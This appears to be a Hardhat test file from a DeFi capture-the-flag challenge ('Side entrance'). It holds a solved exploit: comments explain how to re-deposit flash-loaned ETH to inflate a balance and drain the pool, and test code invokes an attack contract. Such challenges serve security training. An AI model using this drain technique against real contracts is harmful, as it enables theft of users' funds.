const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
      /**
         * @dev
         * The contract has a custom balances mapping to determine how much ETH an address can withdraw.
         * The first flaw is that nothing stops ups from calling the deposit() function during a flashLoan, hence artificially increasing our ETH allowance.
         * The second one is that the function call is done using a contract interface. We can implement any logic we want per standard Object Oriented inheritance, as long as it sticks to the same interface expected by SideEntranceLenderPool.
         * We will create an attacking contract with an execute() function, which will call the pool's deposit() function to deposit ETH in the pool.
         * Then, we create another function that will call the pool's flashLoan(). By calling a flash loan, borrowing the totality of the pool funds, we will trigger the execution of our execute() function that will deposit the ETH borrowed back to the pool. This will increase our balance in the Pool to be equal to the pool funds, which will allow us to drain the funds by calling withdraw().
         * 
         */
      /** CODE YOUR EXPLOIT HERE */
      const SideEntranceAttackFactory = await ethers.getContractFactory(
        'SideEntranceAttack',
        deployer
      );
      this.crooker = await SideEntranceAttackFactory.deploy(this.pool.address, ETHER_IN_POOL);

      const balanceAttacker1 = await ethers.provider.getBalance(
        attacker.address
      );
      console.log(`\u001b[1;33mThe attacker starts with ${Math.trunc(
          ethers.utils.formatEther(balanceAttacker1)
        )} ETH`);
      console.log(`\u001b[1;35mStarting the attack`);
      await this.crooker.attack();
      await this.crooker.drain(attacker.address);

      const balanceAttacker2 = await ethers.provider.getBalance(attacker.address);
      console.log(
        `\u001b[1;33mThe attacker now has got ${Math.trunc(
          ethers.utils.formatEther(balanceAttacker2)
        )} ETH`
      );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
